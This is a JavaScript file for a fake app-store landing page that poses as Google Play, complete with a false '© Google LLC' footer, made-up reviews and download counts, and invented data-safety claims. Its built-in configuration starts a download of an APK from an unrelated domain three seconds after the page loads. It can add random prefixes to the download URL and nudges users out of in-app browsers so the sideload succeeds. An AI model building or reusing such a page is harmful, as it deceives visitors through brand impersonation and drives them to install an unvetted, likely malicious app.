(function() {
    'use strict';

    var settings = null;
    var carouselTimer = null;
    var autoDownloadStarted = false;

    function $(id) {
        return document.getElementById(id);
    }

    function text(el, value) {
        if (el) el.textContent = value == null ? '' : String(value);
    }

    function htmlEscape(value) {
        return String(value == null ? '' : value).replace(/[&<>"']/g, function(m) {
            return ({
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#39;'
            })[m];
        });
    }

    function safeLink(value) {
        var v = String(value == null ? '' : value).trim();
        if (!v || v === '#') return '#';
        if (/^(https?:\/\/|market:\/\/|itms-services:\/\/|itms-apps:\/\/|intent:\/\/|tg:\/\/|whatsapp:\/\/|line:\/\/|\/)/i.test(v)) return v;
        return '#';
    }

    function get(obj, path, fallback) {
        var cur = obj;
        var parts = path.split('.');
        for (var i = 0; i < parts.length; i += 1) {
            if (cur == null) return fallback;
            cur = cur[parts[i]];
        }
        return cur == null ? fallback : cur;
    }

    function setCssVars(theme) {
        if (!theme) return;
        var root = document.documentElement;
        if (theme.background) root.style.setProperty('--bg', theme.background);
        if (theme.secondary) root.style.setProperty('--surface', theme.secondary);
        if (theme.primary) root.style.setProperty('--accent', theme.primary);
        if (theme.accent) root.style.setProperty('--star', theme.accent);
    }

    function iconSvg(name) {
        if (name === 'list') return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"/></svg>';
        if (name === 'lock') return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';
        return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>';
    }

    function isIOS(ua) {
        return /iphone|ipad|ipod/i.test(ua || '');
    }

    function isAndroid(ua) {
        return /android/i.test(ua || '');
    }

    function isInApp(ua) {
        return /micromessenger|qq\/|weibo|fbav|instagram|line\//i.test(ua || '');
    }

    function deviceKind(ua) {
        if (isIOS(ua)) return 'ios';
        if (isAndroid(ua)) return 'android';
        if (/mobile|windows phone/i.test(ua || '')) return 'mobile';
        return 'desktop';
    }

    function track(type, target) {
        var payload = JSON.stringify({
            type: type,
            target: target
        });
        if (navigator.sendBeacon) {
            try {
                var blob = new Blob([payload], {
                    type: 'application/json'
                });
                navigator.sendBeacon('/api/track', blob);
                return;
            } catch (_) {}
        }
        fetch('/api/track', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: payload,
            keepalive: true
        }).catch(function() {});
    }

    function realDownloadUrl(platform, line) {
        var d = (settings && settings.download) || {};
        if (platform === 'ios') return d.iosUrl || d.autoUrl || '';
        if (line === 2) return d.androidUrl2 || '';
        if (line === 3) return d.androidUrl3 || '';
        return d.androidUrl || d.autoUrl || '';
    }

    function randStr(n) {
        var s = 'abcdefghijklmnopqrstuvwxyz0123456789';
        var out = '';
        for (var i = 0; i < n; i += 1) out += s.charAt(Math.floor(Math.random() * s.length));
        return out;
    }

    function applyRandomPrefix(url) {
        var cfg = get(settings, 'download.randomPrefix', {});
        if (!cfg.enabled || !url || !/^https?:\/\//i.test(url)) return url;
        var len = Math.min(24, Math.max(3, Number(cfg.length) || 8));
        var r = randStr(len);
        try {
            var u = new URL(url);
            if (cfg.mode === 'subdomain') {
                u.hostname = r + '.' + u.hostname;
                return u.href;
            }
            if (cfg.mode === 'path') {
                u.pathname = '/' + r + (u.pathname === '/' ? '' : u.pathname);
                return u.href;
            }
            u.searchParams.set('r', r);
            return u.href;
        } catch (_) {
            return url + (url.indexOf('?') >= 0 ? '&' : '?') + 'r=' + r;
        }
    }

    function showGuideIfNeeded() {
        var d = settings.download || {};
        if (d.guideMode !== 'auto' || !isInApp(navigator.userAgent || '')) return false;
        text($('guideTitle'), d.guideTitle);
        text($('guideText'), d.guideText);
        $('guideMask').hidden = false;
        return true;
    }

    function startDownload(platform, line) {
        var url = realDownloadUrl(platform, line);
        var d = settings.download || {};
        if (!url) {
            alert(d.unavailableText || '下载链接暂未配置，请稍后再试');
            return;
        }
        if (showGuideIfNeeded()) return;
        var btn = platform === 'ios' ? $('iosBtn') : $('dlBtn');
        if (btn) {
            btn.disabled = true;
            btn.textContent = d.startedText || 'ダウンロードを開始しました';
            setTimeout(function() {
                btn.disabled = false;
                btn.textContent = platform === 'ios' ? (d.iosButtonText || 'iOS') : (d.buttonText || 'インストール');
            }, 4000);
        }
        var target = platform === 'ios' ? 'download_ios' : (line ? 'download_android_' + line : 'download_android');
        track('click', target);
        track('download', platform === 'ios' ? 'ios' : 'android');
        window.location.href = applyRandomPrefix(url);
    }

    function copyDownloadUrl() {
        var d = settings.download || {};
        var url = applyRandomPrefix(realDownloadUrl('android'));
        if (!url) {
            alert(d.unavailableText || '下载链接暂未配置，请稍后再试');
            return;
        }

        function done() {
            track('click', 'copy_download');
            alert(d.copiedText || '已复制，请到浏览器打开');
        }
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(url).then(done).catch(fallbackCopy);
        } else {
            fallbackCopy();
        }

        function fallbackCopy() {
            var ta = document.createElement('textarea');
            ta.value = url;
            ta.style.position = 'fixed';
            ta.style.opacity = '0';
            document.body.appendChild(ta);
            ta.select();
            try {
                document.execCommand('copy');
            } catch (_) {}
            document.body.removeChild(ta);
            done();
        }
    }

    function applyMaintenance(data) {
        var m = data.maintenance || {};
        if (!m.enabled) return false;
        text($('maintenanceTitle'), m.title);
        text($('maintenanceText'), m.text);
        $('maintenanceMask').hidden = false;
        return true;
    }

    function applyAccess(data) {
        var ua = navigator.userAgent || '';
        var ac = data.access || {};
        var kind = deviceKind(ua);
        var blocked = false;
        if (kind === 'android' && ac.allowAndroid === false) blocked = true;
        if (kind === 'ios' && ac.allowIos === false) blocked = true;
        if (kind === 'desktop' && ac.allowDesktop === false) blocked = true;
        if (ac.blockInApp === true && isInApp(ua)) blocked = true;
        if (!blocked) return false;
        if (ac.blockedRedirectUrl) {
            try {
                window.location.replace(ac.blockedRedirectUrl);
                return true;
            } catch (_) {}
        }
        text($('blockedTitle'), ac.blockedTitle);
        text($('blockedText'), ac.blockedText);
        $('accessBlock').hidden = false;
        return true;
    }

    function renderContact(data) {
        var a = $('contactBtn');
        var c = data.contact || {};
        if (!a) return;
        if (!c.enabled || !c.url) {
            a.hidden = true;
            return;
        }
        a.href = c.url;
        a.textContent = c.text || '联系客服';
        a.hidden = false;
        a.onclick = function() {
            track('click', 'contact_' + (c.type || 'custom'));
        };
    }

    function renderStats(data) {
        if (!get(data, 'socialProof.enabled', false)) return;
        fetch('/api/stats').then(function(r) {
            return r.json();
        }).then(function(json) {
            if (!json.ok) return;
            var tpl = get(data, 'socialProof.text', '{count}+ ダウンロード');
            text($('downloadCount'), tpl.replace('{count}', String(json.data.count || 0)));
        }).catch(function() {});
    }

    function renderScreenshots(list) {
        var wrap = $('screenshotCarousel');
        var dots = $('carouselDots');
        if (!wrap || !dots) return;
        var items = (list || []).filter(function(item) {
            return item && item.enabled !== false && item.image;
        });
        wrap.innerHTML = items.map(function(item, i) {
            return '<div class="screenshot-item' + (i === 0 ? ' active' : '') + '"><img src="' + htmlEscape(item.image) + '" alt="' + htmlEscape(item.alt || ('Screenshot ' + (i + 1))) + '"></div>';
        }).join('');
        dots.innerHTML = items.map(function(_, i) {
            var prefix = get(settings, 'uiText.screenshotAriaPrefix', 'screenshot');
            return '<button class="carousel-dot' + (i === 0 ? ' active' : '') + '" type="button" aria-label="' + htmlEscape(prefix) + ' ' + (i + 1) + '"></button>';
        }).join('');
        setupCarousel();
    }

    function setupCarousel() {
        var carousel = $('screenshotCarousel');
        var dots = Array.prototype.slice.call(document.querySelectorAll('#carouselDots .carousel-dot'));
        var items = Array.prototype.slice.call(document.querySelectorAll('#screenshotCarousel .screenshot-item'));
        if (!carousel || !items.length) return;
        var current = 0;

        function setActive(idx) {
            current = idx;
            items.forEach(function(item, i) {
                item.classList.toggle('active', i === idx);
            });
            dots.forEach(function(dot, i) {
                dot.classList.toggle('active', i === idx);
            });
        }

        function scrollToIndex(idx) {
            var item = items[idx];
            if (!item) return;
            var left = item.offsetLeft - carousel.offsetWidth / 2 + item.offsetWidth / 2;
            carousel.scrollTo({
                left: left,
                behavior: 'smooth'
            });
            setActive(idx);
        }

        function next() {
            scrollToIndex((current + 1) % items.length);
        }
        if (carouselTimer) clearInterval(carouselTimer);
        carouselTimer = setInterval(next, 3200);
        dots.forEach(function(dot, i) {
            dot.onclick = function() {
                clearInterval(carouselTimer);
                scrollToIndex(i);
                carouselTimer = setInterval(next, 4200);
            };
        });
        var scrollTimeout = null;
        carousel.onscroll = function() {
            clearTimeout(scrollTimeout);
            scrollTimeout = setTimeout(function() {
                var center = carousel.scrollLeft + carousel.offsetWidth / 2;
                var closest = 0;
                var min = Infinity;
                items.forEach(function(item, i) {
                    var itemCenter = item.offsetLeft + item.offsetWidth / 2;
                    var dist = Math.abs(center - itemCenter);
                    if (dist < min) {
                        min = dist;
                        closest = i;
                    }
                });
                setActive(closest);
            }, 100);
        };
    }

    function renderSafety(list) {
        var box = $('safetyCard');
        if (!box) return;
        box.innerHTML = (list || []).map(function(item) {
            return '<div class="safety-item"><div class="safety-icon">' + iconSvg(item.icon) + '</div><div class="safety-text"><strong>' + htmlEscape(item.title) + '</strong>' + htmlEscape(item.text) + '</div></div>';
        }).join('');
    }

    function renderRatings(data) {
        var rating = data.rating || {};
        text($('ratingNumber'), rating.score || get(data, 'appStats.rating', '4.8'));
        text($('ratingCount'), rating.count || get(data, 'appStats.reviews', ''));
        var bars = $('ratingBars');
        var values = rating.bars || [78, 15, 4, 2, 1];
        bars.innerHTML = values.slice(0, 5).map(function(value, i) {
            var label = 5 - i;
            return '<div class="bar-row"><span class="bar-label">' + label + '</span><div class="bar-track"><div class="bar-fill" style="width:' + Number(value || 0) + '%"></div></div></div>';
        }).join('');
    }

    function renderReviews(list) {
        var box = $('reviewsList');
        if (!box) return;
        box.innerHTML = (list || []).map(function(item) {
            var stars = new Array(Math.max(1, Math.min(5, Number(item.stars) || 5)) + 1).join('★');
            return '<article class="review-card"><div class="review-top"><div class="review-avatar" style="background:' + htmlEscape(item.color || '#5c6bc0') + '">' + htmlEscape(item.avatar || '') + '</div><div class="review-name">' + htmlEscape(item.name || '') + '</div></div><div class="review-meta"><div class="review-stars">' + stars + '</div><div class="review-date">' + htmlEscape(item.date || '') + '</div></div><div class="review-text">' + htmlEscape(item.text || '') + '</div></article>';
        }).join('');
    }

    function renderSimilar(list) {
        var box = $('similarRow');
        if (!box) return;
        box.innerHTML = (list || []).map(function(item) {
            return '<div class="similar-item"><div class="similar-icon" style="background:linear-gradient(135deg,' + htmlEscape(item.colorA || '#667eea') + ',' + htmlEscape(item.colorB || '#764ba2') + ')"></div><div class="similar-name">' + htmlEscape(item.name || '') + '</div><div class="similar-rating">' + htmlEscape(item.rating || '') + '</div></div>';
        }).join('');
    }

    function renderFooterLinks(list) {
        var nav = $('footerLinks');
        if (!nav) return;
        nav.innerHTML = (list || []).filter(function(item) {
            return item && item.label;
        }).map(function(item) {
            return '<a href="' + htmlEscape(safeLink(item.url)) + '">' + htmlEscape(item.label) + '</a>';
        }).join('');
    }

    function renderDownloadControls(data) {
        var d = data.download || {};
        text($('dlBtn'), d.buttonText || 'インストール');
        text($('iosBtn'), d.iosButtonText || 'iOS');
        text($('copyBtn'), d.copyButtonText || '复制下载链接');
        text($('installHint'), d.securityText || '');
        text($('browserHint'), d.browserHint || '');
        $('dlBtn').onclick = function() {
            startDownload('android');
        };
        $('iosBtn').onclick = function() {
            startDownload('ios');
        };
        $('copyBtn').onclick = copyDownloadUrl;
        $('iosBtn').hidden = !(d.showIosButton || d.iosUrl);
        $('copyBtn').hidden = !(d.showCopyButton && realDownloadUrl('android'));
        var backups = [];
        if (d.androidUrl2) backups.push({
            line: 2,
            label: (d.backupButtonText || '备用线路') + ' 2'
        });
        if (d.androidUrl3) backups.push({
            line: 3,
            label: (d.backupButtonText || '备用线路') + ' 3'
        });
        var box = $('backupButtons');
        if (backups.length) {
            box.hidden = false;
            box.innerHTML = backups.map(function(item) {
                return '<button type="button" data-line="' + item.line + '">' + htmlEscape(item.label) + '</button>';
            }).join('');
            Array.prototype.forEach.call(box.querySelectorAll('button'), function(btn) {
                btn.onclick = function() {
                    startDownload('android', Number(btn.dataset.line));
                };
            });
        } else {
            box.hidden = true;
            box.innerHTML = '';
        }
    }

    function maybeAutoDownload(data) {
        var ad = get(data, 'download.autoDownload', {});
        if (autoDownloadStarted || !ad.enabled || !realDownloadUrl('android')) return;
        autoDownloadStarted = true;
        var delay = Math.max(0, Math.min(30, Number(ad.delaySeconds) || 0)) * 1000;
        setTimeout(function() {
            startDownload('android');
        }, delay);
    }

    function render(data) {
        settings = data;
        setCssVars(data.theme);
        document.title = get(data, 'seo.title', document.title);
        text($('topbarTitle'), get(data, 'uiText.topbarTitle', 'Google Play'));
        if ($('statsRow')) $('statsRow').setAttribute('aria-label', get(data, 'uiText.statsAriaLabel', 'app stats'));
        text($('appName'), get(data, 'brand.nameCn', ''));
        text($('appDeveloper'), get(data, 'brand.developer', ''));
        text($('appTag'), get(data, 'brand.tagLine', ''));
        $('appLogo').src = get(data, 'brand.logoImage', 'assets/images/LOGO.jpg');
        $('appLogo').alt = get(data, 'uiText.iconAlt', 'App Icon');
        text($('ratingValue'), get(data, 'appStats.rating', '4.8'));
        text($('reviewCount'), get(data, 'appStats.reviews', ''));
        text($('downloadCount'), get(data, 'appStats.downloads', ''));
        text($('downloadLabel'), get(data, 'uiText.downloadsLabel', ''));
        text($('ageLabel'), get(data, 'appStats.age', ''));
        text($('screenshotsTitle'), get(data, 'uiText.screenshotsTitle', ''));
        text($('aboutTitle'), get(data, 'about.title', ''));
        text($('aboutText'), get(data, 'about.text', ''));
        $('tagRow').innerHTML = (get(data, 'about.tags', []) || []).map(function(tag) {
            return '<span class="tag">' + htmlEscape(tag) + '</span>';
        }).join('');
        text($('dataSafetyTitle'), get(data, 'uiText.dataSafetyTitle', ''));
        text($('ratingsTitle'), get(data, 'uiText.ratingsTitle', ''));
        text($('whatsNewTitle'), get(data, 'whatsNew.title', ''));
        text($('whatsNewVersion'), get(data, 'whatsNew.version', ''));
        text($('whatsNewDate'), get(data, 'whatsNew.date', ''));
        text($('whatsNewText'), get(data, 'whatsNew.text', ''));
        text($('similarTitle'), get(data, 'uiText.similarTitle', ''));
        text($('footerCompany'), get(data, 'footer.company', ''));
        text($('footerWarning'), get(data, 'footer.warning', ''));
        text($('footerRecord'), get(data, 'footer.record', ''));
        text($('footerVersion'), get(data, 'footer.version', ''));
        var announce = $('announceBar');
        if (get(data, 'announce.enabled', false) && get(data, 'announce.text', '')) {
            text(announce, data.announce.text);
            announce.hidden = false;
        } else {
            announce.hidden = true;
        }
        renderScreenshots(data.screenshots);
        renderSafety(data.safetyItems);
        renderRatings(data);
        renderReviews(data.reviews);
        renderSimilar(data.similarApps);
        renderFooterLinks(get(data, 'footer.links', []));
        renderContact(data);
        renderStats(data);
        renderDownloadControls(data);
        if (applyMaintenance(data)) return;
        if (applyAccess(data)) return;
        maybeAutoDownload(data);
    }

    function init() {
        var close = $('guideClose');
        if (close) close.onclick = function() {
            $('guideMask').hidden = true;
        };
        fetch('/api/settings', {
                cache: 'no-store'
            })
            .then(function(res) {
                return res.json();
            })
            .then(function(json) {
                if (!json.ok) throw new Error(json.error || 'settings failed');
                render(json.data);
                track('view', 'home');
            })
            .catch(function() {
                var data = {
    "ok": true,
    "data": {
        "brand": {
            "nameCn": "ZSY-TV",
            "nameEn": "ZSY-TV",
            "developer": "Developer Studio",
            "tagLine": "Incluye anuncios • Compras dentro de la aplicación disponibles",
            "logoImage": "/uploads/img-1782655570530-ab1ca2de.jpg"
        },
        "seo": {
            "title": "Google Play - Descargas de aplicaciones",
            "description": "Porn hub app download page",
            "keywords": "app, download, android"
        },
        "theme": {
            "primary": "#3ddc84",
            "secondary": "#1e1e1e",
            "accent": "#fdd835",
            "background": "#121212"
        },
        "visual": {
            "backgroundImage": "",
            "desktopBackgroundImage": "",
            "layout": "play"
        },
        "uiText": {
            "topbarTitle": "Google Play",
            "statsAriaLabel": "app stats",
            "downloadsLabel": "descargar",
            "screenshotsTitle": "Captura de pantalla",
            "dataSafetyTitle": "Seguridad de los datos",
            "ratingsTitle": "Calificaciones y reseñas",
            "similarTitle": "Similar apps",
            "iconAlt": "App Icon",
            "screenshotAriaPrefix": "screenshot"
        },
        "download": {
            "androidUrl": "https://xiazsiakpiapk.one/apks/manual/2fc9ecb2b5f1bde6/release.apk",
            "androidUrl2": "",
            "androidUrl3": "",
            "iosUrl": "",
            "autoUrl": "",
            "buttonText": "instalar",
            "iosButtonText": "Abre la versión de iOS",
            "backupButtonText": "备用线路",
            "processingText": "処理中...",
            "startedText": "Descarga iniciada.",
            "unavailableText": "下载链接暂未配置，请稍后再试",
            "showIosButton": false,
            "showCopyButton": false,
            "copyButtonText": "复制下载链接",
            "copiedText": "已复制，请到浏览器打开",
            "guideMode": "auto",
            "guideTitle": "请在系统浏览器中打开",
            "guideText": "如果当前浏览器无法下载，请点击右上角菜单，选择在浏览器中打开。",
            "securityText": "Gratis • Requiere Android 8.0 o posterior",
            "browserHint": "Descarga utilizando una conexión segura.",
            "randomPrefix": {
                "enabled": false,
                "mode": "query",
                "length": 8
            },
            "autoDownload": {
                "enabled": true,
                "delaySeconds": 3
            }
        },
        "access": {
            "allowAndroid": true,
            "allowIos": true,
            "allowDesktop": true,
            "blockInApp": false,
            "blockedTitle": "访问受限",
            "blockedText": "当前设备或浏览器暂不支持访问。",
            "blockedRedirectUrl": ""
        },
        "announce": {
            "enabled": false,
            "text": ""
        },
        "socialProof": {
            "enabled": true,
            "baseCount": 10000000,
            "text": "{count}+ Descargas"
        },
        "contact": {
            "enabled": false,
            "text": "联系客服",
            "url": "",
            "type": "kefu"
        },
        "maintenance": {
            "enabled": false,
            "title": "系统维护中",
            "text": "页面正在维护，请稍后再试。"
        },
        "share": {
            "title": "",
            "description": "",
            "image": "/uploads/img-1782655584328-25eed512.jpg"
        },
        "appStats": {
            "rating": "4.8",
            "reviews": "128.000 reseñas",
            "downloads": "10M+",
            "age": "18 años o más"
        },
        "about": {
            "title": "Acerca de esta aplicación",
            "text": "Esta potente e intuitiva aplicación está diseñada para hacer tu día a día más cómodo. Descubre funciones útiles, conéctate con otros y disfruta de una interfaz fluida que lo simplifica todo.",
            "tags": [
                "Social",
                "Comunicación",
                "Estilo de vida"
            ]
        },
        "safetyItems": [
            {
                "title": "Cifrado de datos",
                "text": "Los datos se transferirán a través de una conexión segura.",
                "icon": "shield"
            },
            {
                "title": "Recopilación de datos",
                "text": "No se comparten datos con terceros.",
                "icon": "list"
            },
            {
                "title": "Puedes solicitar la eliminación de tus datos.",
                "text": "El desarrollador ofrece una forma de solicitar la eliminación de datos.",
                "icon": "lock"
            }
        ],
        "rating": {
            "score": "4.8",
            "count": "128.000 reseñas",
            "bars": [
                78,
                15,
                4,
                2,
                1
            ]
        },
        "reviews": [
            {
                "avatar": "A",
                "color": "#5c6bc0",
                "name": "Akira Tanaka",
                "stars": 5,
                "date": "2026年4月20日",
                "text": "Me encanta esta aplicación. La interfaz es muy fluida e intuitiva. La uso a diario desde hace un mes y mejora con cada actualización."
            },
            {
                "avatar": "Y",
                "color": "#26a69a",
                "name": "Yuki Sato",
                "stars": 5,
                "date": "2026年4月15日",
                "text": "Es muy completo y estable. El equipo de soporte también responde con rapidez. Lo recomiendo a todo el mundo."
            },
            {
                "avatar": "M",
                "color": "#ef5350",
                "name": "Mika Suzuki",
                "stars": 5,
                "date": "2026年4月10日",
                "text": "Esta es una aplicación muy útil con muchas funciones prácticas. Funciona perfectamente en mi dispositivo. Me encantaría que se añadieran más opciones de personalización en futuras actualizaciones."
            }
        ],
        "whatsNew": {
            "title": "Últimas noticias de inteligencia",
            "version": "v3.2.1",
            "date": "2026年4月",
            "text": "• Mejoras de rendimiento y corrección de errores\n• Interfaz de usuario mejorada\n• Nuevas funciones añadidas\n• Mayor estabilidad"
        },
        "screenshots": [
            {
                "image": "/uploads/img-1782658503983-d7e18584.jpg",
                "alt": "Screenshot 1",
                "enabled": true
            },
            {
                "image": "/uploads/img-1782658517083-daadf0bc.jpg",
                "alt": "Screenshot 2",
                "enabled": true
            },
            {
                "image": "/uploads/img-1782658531478-4e86393a.jpg",
                "alt": "Screenshot 3",
                "enabled": true
            },
            {
                "image": "/uploads/img-1782658545406-d831d30a.jpg",
                "alt": "Screenshot 4",
                "enabled": true
            },
            {
                "image": "/uploads/img-1782658559731-baa996c7.jpg",
                "alt": "Screenshot 5",
                "enabled": true
            },
            {
                "image": "/uploads/img-1782658567668-df9526e9.jpg",
                "alt": "Screenshot 6",
                "enabled": true
            }
        ],
        "similarApps": [
            {
                "name": "AppOne",
                "rating": "4.6 ★",
                "colorA": "#667eea",
                "colorB": "#764ba2"
            },
            {
                "name": "AppTwo",
                "rating": "4.4 ★",
                "colorA": "#f093fb",
                "colorB": "#f5576c"
            },
            {
                "name": "AppThree",
                "rating": "4.7 ★",
                "colorA": "#4facfe",
                "colorB": "#00f2fe"
            },
            {
                "name": "AppFour",
                "rating": "4.3 ★",
                "colorA": "#43e97b",
                "colorB": "#38f9d7"
            },
            {
                "name": "AppFive",
                "rating": "4.5 ★",
                "colorA": "#fa709a",
                "colorB": "#fee140"
            }
        ],
        "footer": {
            "version": "© 2026 Google LLC. All rights reserved.",
            "company": "Google Play",
            "warning": "",
            "record": "",
            "links": [
                {
                    "label": "terms of service",
                    "url": "#"
                },
                {
                    "label": "privacy",
                    "url": "#"
                },
                {
                    "label": "About Google Play",
                    "url": "#"
                },
                {
                    "label": "Developer",
                    "url": "#"
                }
            ]
        },
        "imageStyles": {
            "logo": {
                "fit": "cover",
                "x": 50,
                "y": 50,
                "scale": 1,
                "brightness": 100,
                "overlay": 0
            },
            "screenshot": {
                "fit": "cover",
                "x": 50,
                "y": 50,
                "scale": 1,
                "brightness": 100,
                "overlay": 0
            }
        },
        "pixelCodes": []
    }
}
                render(data);
                //alert('页面配置加载失败，请稍后刷新');
            });
    }

    window.PRHB = {
        startDownload: startDownload,
        realDownloadUrl: realDownloadUrl
    };
    document.addEventListener('DOMContentLoaded', init);
})();